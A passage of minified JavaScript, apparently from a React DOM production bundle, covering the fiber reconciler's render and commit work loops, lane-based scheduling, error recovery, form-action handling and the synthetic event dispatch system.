    function xd(z, J, le, me, Se, Oe, pt, bt, Mt, Ut, Jt, rr, zt, Ht) {
        if (z.timeoutHandle = -1,
        rr = J.subtreeFlags,
        (rr & 8192 || (rr & 16785408) === 16785408) && (Qo = {
            stylesheets: null,
            count: 0,
            unsuspend: Bp
        },
        md(J),
        rr = $p(),
        rr !== null)) {
            z.cancelPendingCommit = rr(Td.bind(null, z, J, Oe, le, me, Se, pt, bt, Mt, Jt, 1, zt, Ht)),
            Zi(z, Oe, pt, !Ut);
            return
        }
        Td(z, J, Oe, le, me, Se, pt, bt, Mt)
    }
    function Jh(z) {
        for (var J = z; ; ) {
            var le = J.tag;
            if ((le === 0 || le === 11 || le === 15) && J.flags & 16384 && (le = J.updateQueue,
            le !== null && (le = le.stores,
            le !== null)))
                for (var me = 0; me < le.length; me++) {
                    var Se = le[me]
                      , Oe = Se.getSnapshot;
                    Se = Se.value;
                    try {
                        if (!Hn(Oe(), Se))
                            return !1
                    } catch {
                        return !1
                    }
                }
            if (le = J.child,
            J.subtreeFlags & 16384 && le !== null)
                le.return = J,
                J = le;
            else {
                if (J === z)
                    break;
                for (; J.sibling === null; ) {
                    if (J.return === null || J.return === z)
                        return !0;
                    J = J.return
                }
                J.sibling.return = J.return,
                J = J.sibling
            }
        }
        return !0
    }
    function Zi(z, J, le, me) {
        J &= ~Tl,
        J &= ~Ea,
        z.suspendedLanes |= J,
        z.pingedLanes &= ~J,
        me && (z.warmLanes |= J),
        me = z.expirationTimes;
        for (var Se = J; 0 < Se; ) {
            var Oe = 31 - He(Se)
              , pt = 1 << Oe;
            me[Oe] = -1,
            Se &= ~pt
        }
        le !== 0 && xr(z, le, J)
    }
    function Ks() {
        return (nn & 6) === 0 ? (Ko(0),
        !1) : !0
    }
    function Il() {
        if (Vr !== null) {
            if (an === 0)
                var z = Vr.return;
            else
                z = Vr,
                xi = ga = null,
                Qu(z),
                Ka = null,
                $o = 0,
                z = Vr;
            for (; z !== null; )
                td(z.alternate, z),
                z = z.return;
            Vr = null
        }
    }
    function eo(z, J) {
        var le = z.timeoutHandle;
        le !== -1 && (z.timeoutHandle = -1,
        yp(le)),
        le = z.cancelPendingCommit,
        le !== null && (z.cancelPendingCommit = null,
        le()),
        Il(),
        dn = z,
        Vr = le = bi(z.current, null),
        Wr = J,
        an = 0,
        Gn = null,
        Xi = !1,
        Ya = gt(z, J),
        ql = !1,
        Za = ri = Tl = Ea = Gi = yn = 0,
        Fn = Ho = null,
        Cl = !1,
        (J & 8) !== 0 && (J |= J & 32);
        var me = z.entangledLanes;
        if (me !== 0)
            for (z = z.entanglements,
            me &= J; 0 < me; ) {
                var Se = 31 - He(me)
                  , Oe = 1 << Se;
                J |= z[Se],
                me &= ~Oe
            }
        return Ci = J,
        hs(),
        le
    }
    function Sd(z, J) {
        zr = null,
        te.H = Ps,
        J === Mo || J === Ss ? (J = Lc(),
        an = 3) : J === $c ? (J = Lc(),
        an = 4) : an = J === Uf ? 8 : J !== null && typeof J == "object" && typeof J.then == "function" ? 6 : 1,
        Gn = J,
        Vr === null && (yn = 1,
        Ds(z, Zn(J, z.current)))
    }
    function Ed() {
        var z = te.H;
        return te.H = Ps,
        z === null ? Ps : z
    }
    function Rd() {
        var z = te.A;
        return te.A = Zh,
        z
    }
    function $l() {
        yn = 4,
        Xi || (Wr & 4194048) !== Wr && ti.current !== null || (Ya = !0),
        (Gi & 134217727) === 0 && (Ea & 134217727) === 0 || dn === null || Zi(dn, Wr, ri, !1)
    }
    function Nl(z, J, le) {
        var me = nn;
        nn |= 2;
        var Se = Ed()
          , Oe = Rd();
        (dn !== z || Wr !== J) && (Vs = null,
        eo(z, J)),
        J = !1;
        var pt = yn;
        e: do
            try {
                if (an !== 0 && Vr !== null) {
                    var bt = Vr
                      , Mt = Gn;
                    switch (an) {
                    case 8:
                        Il(),
                        pt = 6;
                        break e;
                    case 3:
                    case 2:
                    case 9:
                    case 6:
                        ti.current === null && (J = !0);
                        var Ut = an;
                        if (an = 0,
                        Gn = null,
                        to(z, bt, Mt, Ut),
                        le && Ya) {
                            pt = 0;
                            break e
                        }
                        break;
                    default:
                        Ut = an,
                        an = 0,
                        Gn = null,
                        to(z, bt, Mt, Ut)
                    }
                }
                ep(),
                pt = yn;
                break
            } catch (Jt) {
                Sd(z, Jt)
            }
        while (!0);
        return J && z.shellSuspendCounter++,
        xi = ga = null,
        nn = me,
        te.H = Se,
        te.A = Oe,
        Vr === null && (dn = null,
        Wr = 0,
        hs()),
        pt
    }
    function ep() {
        for (; Vr !== null; )
            Ad(Vr)
    }
    function tp(z, J) {
        var le = nn;
        nn |= 2;
        var me = Ed()
          , Se = Rd();
        dn !== z || Wr !== J ? (Vs = null,
        Hs = Ke() + 500,
        eo(z, J)) : Ya = gt(z, J);
        e: do
            try {
                if (an !== 0 && Vr !== null) {
                    J = Vr;
                    var Oe = Gn;
                    t: switch (an) {
                    case 1:
                        an = 0,
                        Gn = null,
                        to(z, J, Oe, 1);
                        break;
                    case 2:
                    case 9:
                        if (Nc(Oe)) {
                            an = 0,
                            Gn = null,
                            Md(J);
                            break
                        }
                        J = function() {
                            an !== 2 && an !== 9 || dn !== z || (an = 7),
                            mi(z)
                        }
                        ,
                        Oe.then(J, J);
                        break e;
                    case 3:
                        an = 7;
                        break e;
                    case 4:
                        an = 5;
                        break e;
                    case 7:
                        Nc(Oe) ? (an = 0,
                        Gn = null,
                        Md(J)) : (an = 0,
                        Gn = null,
                        to(z, J, Oe, 7));
                        break;
                    case 5:
                        var pt = null;
                        switch (Vr.tag) {
                        case 26:
                            pt = Vr.memoizedState;
                        case 5:
                        case 27:
                            var bt = Vr;
                            if (!pt || uh(pt)) {
                                an = 0,
                                Gn = null;
                                var Mt = bt.sibling;
                                if (Mt !== null)
                                    Vr = Mt;
                                else {
                                    var Ut = bt.return;
                                    Ut !== null ? (Vr = Ut,
                                    Xs(Ut)) : Vr = null
                                }
                                break t
                            }
                        }
                        an = 0,
                        Gn = null,
                        to(z, J, Oe, 5);
                        break;
                    case 6:
                        an = 0,
                        Gn = null,
                        to(z, J, Oe, 6);
                        break;
                    case 8:
                        Il(),
                        yn = 6;
                        break e;
                    default:
                        throw Error(O(462))
                    }
                }
                rp();
                break
            } catch (Jt) {
                Sd(z, Jt)
            }
        while (!0);
        return xi = ga = null,
        te.H = me,
        te.A = Se,
        nn = le,
        Vr !== null ? 0 : (dn = null,
        Wr = 0,
        hs(),
        yn)
    }
    function rp() {
        for (; Vr !== null && !nt(); )
            Ad(Vr)
    }
    function Ad(z) {
        var J = Jf(z.alternate, z, Ci);
        z.memoizedProps = z.pendingProps,
        J === null ? Xs(z) : Vr = J
    }
    function Md(z) {
        var J = z
          , le = J.alternate;
        switch (J.tag) {
        case 15:
        case 0:
            J = Xf(le, J, J.pendingProps, J.type, void 0, Wr);
            break;
        case 11:
            J = Xf(le, J, J.pendingProps, J.type.render, J.ref, Wr);
            break;
        case 5:
            Qu(J);
        default:
            td(le, J),
            J = Vr = Mc(J, Ci),
            J = Jf(le, J, Ci)
        }
        z.memoizedProps = z.pendingProps,
        J === null ? Xs(z) : Vr = J
    }
    function to(z, J, le, me) {
        xi = ga = null,
        Qu(J),
        Ka = null,
        $o = 0;
        var Se = J.return;
        try {
            if (Vh(z, Se, J, le, Wr)) {
                yn = 1,
                Ds(z, Zn(le, z.current)),
                Vr = null;
                return
            }
        } catch (Oe) {
            if (Se !== null)
                throw Vr = Se,
                Oe;
            yn = 1,
            Ds(z, Zn(le, z.current)),
            Vr = null;
            return
        }
        J.flags & 32768 ? (Jr || me === 1 ? z = !0 : Ya || (Wr & 536870912) !== 0 ? z = !1 : (Xi = z = !0,
        (me === 2 || me === 9 || me === 3 || me === 6) && (me = ti.current,
        me !== null && me.tag === 13 && (me.flags |= 16384))),
        qd(J, z)) : Xs(J)
    }
    function Xs(z) {
        var J = z;
        do {
            if ((J.flags & 32768) !== 0) {
                qd(J, Xi);
                return
            }
            z = J.return;
            var le = Xh(J.alternate, J, Ci);
            if (le !== null) {
                Vr = le;
                return
            }
            if (J = J.sibling,
            J !== null) {
                Vr = J;
                return
            }
            Vr = J = z
        } while (J !== null);
        yn === 0 && (yn = 5)
    }
    function qd(z, J) {
        do {
            var le = Gh(z.alternate, z);
            if (le !== null) {
                le.flags &= 32767,
                Vr = le;
                return
            }
            if (le = z.return,
            le !== null && (le.flags |= 32768,
            le.subtreeFlags = 0,
            le.deletions = null),
            !J && (z = z.sibling,
            z !== null)) {
                Vr = z;
                return
            }
            Vr = z = le
        } while (z !== null);
        yn = 6,
        Vr = null
    }
    function Td(z, J, le, me, Se, Oe, pt, bt, Mt) {
        z.cancelPendingCommit = null;
        do
            Gs();
        while (On !== 0);
        if ((nn & 6) !== 0)
            throw Error(O(327));
        if (J !== null) {
            if (J === z.current)
                throw Error(O(177));
            if (Oe = J.lanes | J.childLanes,
            Oe |= Mu,
            Bt(z, le, Oe, pt, bt, Mt),
            z === dn && (Vr = dn = null,
            Wr = 0),
            Qa = J,
            Yi = z,
            Ja = le,
            Ol = Oe,
            Pl = Se,
            bd = me,
            (J.subtreeFlags & 10256) !== 0 || (J.flags & 10256) !== 0 ? (z.callbackNode = null,
            z.callbackPriority = 0,
            op(ct, function() {
                return Bd(),
                null
            })) : (z.callbackNode = null,
            z.callbackPriority = 0),
            me = (J.flags & 13878) !== 0,
            (J.subtreeFlags & 13878) !== 0 || me) {
                me = te.T,
                te.T = null,
                Se = se.p,
                se.p = 2,
                pt = nn,
                nn |= 4;
                try {
                    Wh(z, J, le)
                } finally {
                    nn = pt,
                    se.p = Se,
                    te.T = me
                }
            }
            On = 1,
            Cd(),
            kd(),
            Od()
        }
    }
    function Cd() {
        if (On === 1) {
            On = 0;
            var z = Yi
              , J = Qa
              , le = (J.flags & 13878) !== 0;
            if ((J.subtreeFlags & 13878) !== 0 || le) {
                le = te.T,
                te.T = null;
                var me = se.p;
                se.p = 2;
                var Se = nn;
                nn |= 4;
                try {
                    dd(J, z);
                    var Oe = Wl
                      , pt = yc(z.containerInfo)
                      , bt = Oe.focusedElem
                      , Mt = Oe.selectionRange;
                    if (pt !== bt && bt && bt.ownerDocument && vc(bt.ownerDocument.documentElement, bt)) {
                        if (Mt !== null && xu(bt)) {
                            var Ut = Mt.start
                              , Jt = Mt.end;
                            if (Jt === void 0 && (Jt = Ut),
                            "selectionStart"in bt)
                                bt.selectionStart = Ut,
                                bt.selectionEnd = Math.min(Jt, bt.value.length);
                            else {
                                var rr = bt.ownerDocument || document
                                  , zt = rr && rr.defaultView || window;
                                if (zt.getSelection) {
                                    var Ht = zt.getSelection()
                                      , $r = bt.textContent.length
                                      , kr = Math.min(Mt.start, $r)
                                      , un = Mt.end === void 0 ? kr : Math.min(Mt.end, $r);
                                    !Ht.extend && kr > un && (pt = un,
                                    un = kr,
                                    kr = pt);
                                    var It = mc(bt, kr)
                                      , kt = mc(bt, un);
                                    if (It && kt && (Ht.rangeCount !== 1 || Ht.anchorNode !== It.node || Ht.anchorOffset !== It.offset || Ht.focusNode !== kt.node || Ht.focusOffset !== kt.offset)) {
                                        var Lt = rr.createRange();
                                        Lt.setStart(It.node, It.offset),
                                        Ht.removeAllRanges(),
                                        kr > un ? (Ht.addRange(Lt),
                                        Ht.extend(kt.node, kt.offset)) : (Lt.setEnd(kt.node, kt.offset),
                                        Ht.addRange(Lt))
                                    }
                                }
                            }
                        }
                        for (rr = [],
                        Ht = bt; Ht = Ht.parentNode; )
                            Ht.nodeType === 1 && rr.push({
                                element: Ht,
                                left: Ht.scrollLeft,
                                top: Ht.scrollTop
                            });
                        for (typeof bt.focus == "function" && bt.focus(),
                        bt = 0; bt < rr.length; bt++) {
                            var tr = rr[bt];
                            tr.element.scrollLeft = tr.left,
                            tr.element.scrollTop = tr.top
                        }
                    }
                    ou = !!Gl,
                    Wl = Gl = null
                } finally {
                    nn = Se,
                    se.p = me,
                    te.T = le
                }
            }
            z.current = J,
            On = 2
        }
    }
    function kd() {
        if (On === 2) {
            On = 0;
            var z = Yi
              , J = Qa
              , le = (J.flags & 8772) !== 0;
            if ((J.subtreeFlags & 8772) !== 0 || le) {
                le = te.T,
                te.T = null;
                var me = se.p;
                se.p = 2;
                var Se = nn;
                nn |= 4;
                try {
                    ud(z, J.alternate, J)
                } finally {
                    nn = Se,
                    se.p = me,
                    te.T = le
                }
            }
            On = 3
        }
    }
    function Od() {
        if (On === 4 || On === 3) {
            On = 0,
            je();
            var z = Yi
              , J = Qa
              , le = Ja
              , me = bd;
            (J.subtreeFlags & 10256) !== 0 || (J.flags & 10256) !== 0 ? On = 5 : (On = 0,
            Qa = Yi = null,
            Pd(z, z.pendingLanes));
            var Se = z.pendingLanes;
            if (Se === 0 && (Wi = null),
            Mr(le),
            J = J.stateNode,
            et && typeof et.onCommitFiberRoot == "function")
                try {
                    et.onCommitFiberRoot(st, J, void 0, (J.current.flags & 128) === 128)
                } catch {}
            if (me !== null) {
                J = te.T,
                Se = se.p,
                se.p = 2,
                te.T = null;
                try {
                    for (var Oe = z.onRecoverableError, pt = 0; pt < me.length; pt++) {
                        var bt = me[pt];
                        Oe(bt.value, {
                            componentStack: bt.stack
                        })
                    }
                } finally {
                    te.T = J,
                    se.p = Se
                }
            }
            (Ja & 3) !== 0 && Gs(),
            mi(z),
            Se = z.pendingLanes,
            (le & 4194090) !== 0 && (Se & 42) !== 0 ? z === Bl ? Vo++ : (Vo = 0,
            Bl = z) : Vo = 0,
            Ko(0)
        }
    }
    function Pd(z, J) {
        (z.pooledCacheLanes &= J) === 0 && (J = z.pooledCache,
        J != null && (z.pooledCache = null,
        Ro(J)))
    }
    function Gs(z) {
        return Cd(),
        kd(),
        Od(),
        Bd()
    }
    function Bd() {
        if (On !== 5)
            return !1;
        var z = Yi
          , J = Ol;
        Ol = 0;
        var le = Mr(Ja)
          , me = te.T
          , Se = se.p;
        try {
            se.p = 32 > le ? 32 : le,
            te.T = null,
            le = Pl,
            Pl = null;
            var Oe = Yi
              , pt = Ja;
            if (On = 0,
            Qa = Yi = null,
            Ja = 0,
            (nn & 6) !== 0)
                throw Error(O(331));
            var bt = nn;
            if (nn |= 4,
            yd(Oe.current),
            pd(Oe, Oe.current, pt, le),
            nn = bt,
            Ko(0, !1),
            et && typeof et.onPostCommitFiberRoot == "function")
                try {
                    et.onPostCommitFiberRoot(st, Oe)
                } catch {}
            return !0
        } finally {
            se.p = Se,
            te.T = me,
            Pd(z, J)
        }
    }
    function Id(z, J, le) {
        J = Zn(le, J),
        J = dl(z.stateNode, J, 2),
        z = ji(z, J, 2),
        z !== null && (Pt(z, 2),
        mi(z))
    }
    function cn(z, J, le) {
        if (z.tag === 3)
            Id(z, z, le);
        else
            for (; J !== null; ) {
                if (J.tag === 3) {
                    Id(J, z, le);
                    break
                } else if (J.tag === 1) {
                    var me = J.stateNode;
                    if (typeof J.type.getDerivedStateFromError == "function" || typeof me.componentDidCatch == "function" && (Wi === null || !Wi.has(me))) {
                        z = Zn(le, z),
                        le = Lf(2),
                        me = ji(J, le, 2),
                        me !== null && (jf(le, me, J, z),
                        Pt(me, 2),
                        mi(me));
                        break
                    }
                }
                J = J.return
            }
    }
    function Dl(z, J, le) {
        var me = z.pingCache;
        if (me === null) {
            me = z.pingCache = new Qh;
            var Se = new Set;
            me.set(J, Se)
        } else
            Se = me.get(J),
            Se === void 0 && (Se = new Set,
            me.set(J, Se));
        Se.has(le) || (ql = !0,
        Se.add(le),
        z = np.bind(null, z, J, le),
        J.then(z, z))
    }
    function np(z, J, le) {
        var me = z.pingCache;
        me !== null && me.delete(J),
        z.pingedLanes |= z.suspendedLanes & le,
        z.warmLanes &= ~le,
        dn === z && (Wr & le) === le && (yn === 4 || yn === 3 && (Wr & 62914560) === Wr && 300 > Ke() - kl ? (nn & 2) === 0 && eo(z, 0) : Tl |= le,
        Za === Wr && (Za = 0)),
        mi(z)
    }
    function $d(z, J) {
        J === 0 && (J = Ot()),
        z = $a(z, J),
        z !== null && (Pt(z, J),
        mi(z))
    }
    function ip(z) {
        var J = z.memoizedState
          , le = 0;
        J !== null && (le = J.retryLane),
        $d(z, le)
    }
    function ap(z, J) {
        var le = 0;
        switch (z.tag) {
        case 13:
            var me = z.stateNode
              , Se = z.memoizedState;
            Se !== null && (le = Se.retryLane);
            break;
        case 19:
            me = z.stateNode;
            break;
        case 22:
            me = z.stateNode._retryCache;
            break;
        default:
            throw Error(O(314))
        }
        me !== null && me.delete(J),
        $d(z, le)
    }
    function op(z, J) {
        return Ve(z, J)
    }
    var Ws = null
      , ro = null
      , Ll = !1
      , Ys = !1
      , jl = !1
      , Ra = 0;
    function mi(z) {
        z !== ro && z.next === null && (ro === null ? Ws = ro = z : ro = ro.next = z),
        Ys = !0,
        Ll || (Ll = !0,
        up())
    }
    function Ko(z, J) {
        if (!jl && Ys) {
            jl = !0;
            do
                for (var le = !1, me = Ws; me !== null; ) {
                    if (z !== 0) {
                        var Se = me.pendingLanes;
                        if (Se === 0)
                            var Oe = 0;
                        else {
                            var pt = me.suspendedLanes
                              , bt = me.pingedLanes;
                            Oe = (1 << 31 - He(42 | z) + 1) - 1,
                            Oe &= Se & ~(pt & ~bt),
                            Oe = Oe & 201326741 ? Oe & 201326741 | 1 : Oe ? Oe | 2 : 0
                        }
                        Oe !== 0 && (le = !0,
                        jd(me, Oe))
                    } else
                        Oe = Wr,
                        Oe = ft(me, me === dn ? Oe : 0, me.cancelPendingCommit !== null || me.timeoutHandle !== -1),
                        (Oe & 3) === 0 || gt(me, Oe) || (le = !0,
                        jd(me, Oe));
                    me = me.next
                }
            while (le);
            jl = !1
        }
    }
    function sp() {
        Nd()
    }
    function Nd() {
        Ys = Ll = !1;
        var z = 0;
        Ra !== 0 && (vp() && (z = Ra),
        Ra = 0);
        for (var J = Ke(), le = null, me = Ws; me !== null; ) {
            var Se = me.next
              , Oe = Dd(me, J);
            Oe === 0 ? (me.next = null,
            le === null ? Ws = Se : le.next = Se,
            Se === null && (ro = le)) : (le = me,
            (z !== 0 || (Oe & 3) !== 0) && (Ys = !0)),
            me = Se
        }
        Ko(z)
    }
    function Dd(z, J) {
        for (var le = z.suspendedLanes, me = z.pingedLanes, Se = z.expirationTimes, Oe = z.pendingLanes & -62914561; 0 < Oe; ) {
            var pt = 31 - He(Oe)
              , bt = 1 << pt
              , Mt = Se[pt];
            Mt === -1 ? ((bt & le) === 0 || (bt & me) !== 0) && (Se[pt] = Yt(bt, J)) : Mt <= J && (z.expiredLanes |= bt),
            Oe &= ~bt
        }
        if (J = dn,
        le = Wr,
        le = ft(z, z === J ? le : 0, z.cancelPendingCommit !== null || z.timeoutHandle !== -1),
        me = z.callbackNode,
        le === 0 || z === J && (an === 2 || an === 9) || z.cancelPendingCommit !== null)
            return me !== null && me !== null && lt(me),
            z.callbackNode = null,
            z.callbackPriority = 0;
        if ((le & 3) === 0 || gt(z, le)) {
            if (J = le & -le,
            J === z.callbackPriority)
                return J;
            switch (me !== null && lt(me),
            Mr(le)) {
            case 2:
            case 8:
                le = mt;
                break;
            case 32:
                le = ct;
                break;
            case 268435456:
                le = we;
                break;
            default:
                le = ct
            }
            return me = Ld.bind(null, z),
            le = Ve(le, me),
            z.callbackPriority = J,
            z.callbackNode = le,
            J
        }
        return me !== null && me !== null && lt(me),
        z.callbackPriority = 2,
        z.callbackNode = null,
        2
    }
    function Ld(z, J) {
        if (On !== 0 && On !== 5)
            return z.callbackNode = null,
            z.callbackPriority = 0,
            null;
        var le = z.callbackNode;
        if (Gs() && z.callbackNode !== le)
            return null;
        var me = Wr;
        return me = ft(z, z === dn ? me : 0, z.cancelPendingCommit !== null || z.timeoutHandle !== -1),
        me === 0 ? null : (wd(z, me, J),
        Dd(z, Ke()),
        z.callbackNode != null && z.callbackNode === le ? Ld.bind(null, z) : null)
    }
    function jd(z, J) {
        if (Gs())
            return null;
        wd(z, J, !0)
    }
    function up() {
        gp(function() {
            (nn & 6) !== 0 ? Ve(We, sp) : Nd()
        })
    }
    function Ul() {
        return Ra === 0 && (Ra = Ct()),
        Ra
    }
    function Ud(z) {
        return z == null || typeof z == "symbol" || typeof z == "boolean" ? null : typeof z == "function" ? z : Fr("" + z)
    }
    function Fd(z, J) {
        var le = J.ownerDocument.createElement("input");
        return le.name = J.name,
        le.value = J.value,
        z.id && le.setAttribute("form", z.id),
        J.parentNode.insertBefore(le, J),
        z = new FormData(z),
        le.parentNode.removeChild(le),
        z
    }
    function lp(z, J, le, me, Se) {
        if (J === "submit" && le && le.stateNode === Se) {
            var Oe = Ud((Se[_t] || null).action)
              , pt = me.submitter;
            pt && (J = (J = pt[_t] || null) ? Ud(J.formAction) : pt.getAttribute("formAction"),
            J !== null && (Oe = J,
            pt = null));
            var bt = new sa("action","action",null,me,Se);
            z.push({
                event: bt,
                listeners: [{
                    instance: null,
                    listener: function() {
                        if (me.defaultPrevented) {
                            if (Ra !== 0) {
                                var Mt = pt ? Fd(Se, pt) : new FormData(Se);
                                sl(le, {
                                    pending: !0,
                                    data: Mt,
                                    method: Se.method,
                                    action: Oe
                                }, null, Mt)
                            }
                        } else
                            typeof Oe == "function" && (bt.preventDefault(),
                            Mt = pt ? Fd(Se, pt) : new FormData(Se),
                            sl(le, {
                                pending: !0,
                                data: Mt,
                                method: Se.method,
                                action: Oe
                            }, Oe, Mt))
                    },
                    currentTarget: Se
                }]
            })
        }
    }
    for (var Fl = 0; Fl < Au.length; Fl++) {
        var zl = Au[Fl]
          , cp = zl.toLowerCase()
          , fp = zl[0].toUpperCase() + zl.slice(1);
        si(cp, "on" + fp)
    }
    si(_c, "onAnimationEnd"),
    si(wc, "onAnimationIteration"),
    si(xc, "onAnimationStart"),
    si("dblclick", "onDoubleClick"),
    si("focusin", "onFocus"),
    si("focusout", "onBlur"),
    si(qh, "onTransitionRun"),
    si(Th, "onTransitionStart"),
    si(Ch, "onTransitionCancel"),
    si(Sc, "onTransitionEnd"),
    gr("onMouseEnter", ["mouseout", "mouseover"]),
    gr("onMouseLeave", ["mouseout", "mouseover"]),
    gr("onPointerEnter", ["pointerout", "pointerover"]),
    gr("onPointerLeave", ["pointerout", "pointerover"]),
    vr("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
    vr("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
    vr("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
    vr("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
    vr("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
    vr("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
    var Xo = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
      , dp = new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Xo));
    function zd(z, J) {
        J = (J & 4) !== 0;
        for (var le = 0; le < z.length; le++) {
            var me = z[le]
              , Se = me.event;
            me = me.listeners;
            e: {
                var Oe = void 0;
                if (J)
                    for (var pt = me.length - 1; 0 <= pt; pt--) {
                        var bt = me[pt]
                          , Mt = bt.instance
                          , Ut = bt.currentTarget;
                        if (bt = bt.listener,
                        Mt !== Oe && Se.isPropagationStopped())
                            break e;
                        Oe = bt,
                        Se.currentTarget = Ut;
                        try {
                            Oe(Se)
                        } catch (Jt) {
                            Ns(Jt)
                        }
                        Se.currentTarget = null,
                        Oe = Mt
                    }
                else
                    for (pt = 0; pt < me.length; pt++) {
                        if (bt = me[pt],
                        Mt = bt.instance,
                        Ut = bt.currentTarget,
                        bt = bt.listener,
                        Mt !== Oe && Se.isPropagationStopped())
                            break e;
                        Oe = bt,
                        Se.currentTarget = Ut;
                        try {
                            Oe(Se)
                        } catch (Jt) {
                            Ns(Jt)
                        }
                        Se.currentTarget = null,
                        Oe = Mt
                    }
            }
        }
    }
    function Kr(z, J) {
        var le = J[Ye];
        le === void 0 && (le = J[Ye] = new Set);
        var me = z + "__bubble";
        le.has(me) || (Hd(J, z, 2, !1),
        le.add(me))
    }
    function Hl(z, J, le) {
        var me = 0;
        J && (me |= 4),
        Hd(le, z, me, J)
    }
    var Zs = "_reactListening" + Math.random().toString(36).slice(2);
    function Vl(z) {
        if (!z[Zs]) {
            z[Zs] = !0,
            or.forEach(function(le) {
                le !== "selectionchange" && (dp.has(le) || Hl(le, !1, z),
                Hl(le, !0, z))
            });
            var J = z.nodeType === 9 ? z : z.ownerDocument;
            J === null || J[Zs] || (J[Zs] = !0,
            Hl("selectionchange", !1, J))
        }
    }
    function Hd(z, J, le, me) {
        switch (mh(J)) {
        case 2:
            var Se = Lp;
            break;
        case 8:
            Se = jp;
            break;
        default:
            Se = oc
        }
        le = Se.bind(null, J, le, z),
        Se = void 0,
        !Aa || J !== "touchstart" && J !== "touchmove" && J !== "wheel" || (Se = !0),
        me ? Se !== void 0 ? z.addEventListener(J, le, {
            capture: !0,
            passive: Se
        }) : z.addEventListener(J, le, !0) : Se !== void 0 ? z.addEventListener(J, le, {
            passive: Se
        }) : z.addEventListener(J, le, !1)
    }
    function Kl(z, J, le, me, Se) {
        var Oe = me;
        if ((J & 1) === 0 && (J & 2) === 0 && me !== null)
            e: for (; ; ) {
                if (me === null)
                    return;
                var pt = me.tag;
                if (pt === 3 || pt === 4) {
                    var bt = me.stateNode.containerInfo;
                    if (bt === Se)
                        break;
                    if (pt === 4)
                        for (pt = me.return; pt !== null; ) {
                            var Mt = pt.tag;
                            if ((Mt === 3 || Mt === 4) && pt.stateNode.containerInfo === Se)
                                return;
                            pt = pt.return
                        }
                    for (; bt !== null; ) {
                        if (pt = St(bt),
                        pt === null)
                            return;
                        if (Mt = pt.tag,
                        Mt === 5 || Mt === 6 || Mt === 26 || Mt === 27) {
                            me = Oe = pt;
                            continue e
                        }
                        bt = bt.parentNode
                    }
                }
                me = me.return
            }
        aa(function() {
            var Ut = Oe
              , Jt = hr(le)
              , rr = [];
            e: {
                var zt = Ec.get(z);
                if (zt !== void 0) {
                    var Ht = sa
                      , $r = z;
                    switch (z) {
                    case "keypress":
                        if (oi(le) === 0)
                            break e;
                    case "keydown":
                    case "keyup":
                        Ht = ls;
                        break;
                    case "focusin":
                        $r = "focus",
                        Ht = po;
                        break;
                    case "focusout":
                        $r = "blur",
                        Ht = po;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        Ht = po;
                        break;
                    case "click":
                        if (le.button === 2)
                            break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        Ht = fo;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        Ht = ho;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        Ht = cs;
                        break;
                    case _c:
                    case wc:
                    case xc:
                        Ht = ka;
                        break;
                    case Sc:
                        Ht = fs;
                        break;
                    case "scroll":
                    case "scrollend":
                        Ht = as;
                        break;
                    case "wheel":
                        Ht = ds;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        Ht = mu;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        Ht = $n;
                        break;
                    case "toggle":
                    case "beforetoggle":
                        Ht = vo
                    }
                    var kr = (J & 4) !== 0
                      , un = !kr && (z === "scroll" || z === "scrollend")
                      , It = kr ? zt !== null ? zt + "Capture" : null : zt;
                    kr = [];
                    for (var kt = Ut, Lt; kt !== null; ) {
                        var tr = kt;
                        if (Lt = tr.stateNode,
                        tr = tr.tag,
                        tr !== 5 && tr !== 26 && tr !== 27 || Lt === null || It === null || (tr = oa(kt, It),
                        tr != null && kr.push(Go(kt, tr, Lt))),
                        un)
                            break;
                        kt = kt.return
                    }
                    0 < kr.length && (zt = new Ht(zt,$r,null,le,Jt),
                    rr.push({
                        event: zt,
                        listeners: kr
                    }))
                }
            }
            if ((J & 7) === 0) {
                e: {
                    if (zt = z === "mouseover" || z === "pointerover",
                    Ht = z === "mouseout" || z === "pointerout",
                    zt && le !== ia && ($r = le.relatedTarget || le.fromElement) && (St($r) || $r[Ge]))
                        break e;
                    if ((Ht || zt) && (zt = Jt.window === Jt ? Jt : (zt = Jt.ownerDocument) ? zt.defaultView || zt.parentWindow : window,
                    Ht ? ($r = le.relatedTarget || le.toElement,
                    Ht = Ut,
                    $r = $r ? St($r) : null,
                    $r !== null && (un = w($r),
                    kr = $r.tag,
                    $r !== un || kr !== 5 && kr !== 27 && kr !== 6) && ($r = null)) : (Ht = null,
                    $r = Ut),
                    Ht !== $r)) {
                        if (kr = fo,
                        tr = "onMouseLeave",
                        It = "onMouseEnter",
                        kt = "mouse",
                        (z === "pointerout" || z === "pointerover") && (kr = $n,
                        tr = "onPointerLeave",
                        It = "onPointerEnter",
                        kt = "pointer"),
                        un = Ht == null ? zt : er(Ht),
                        Lt = $r == null ? zt : er($r),
                        zt = new kr(tr,kt + "leave",Ht,le,Jt),
                        zt.target = un,
                        zt.relatedTarget = Lt,
                        tr = null,
                        St(Jt) === Ut && (kr = new kr(It,kt + "enter",$r,le,Jt),
                        kr.target = Lt,
                        kr.relatedTarget = un,
                        tr = kr),
                        un = tr,
                        Ht && $r)
                            t: {
                                for (kr = Ht,
                                It = $r,
                                kt = 0,
                                Lt = kr; Lt; Lt = no(Lt))
                                    kt++;
                                for (Lt = 0,
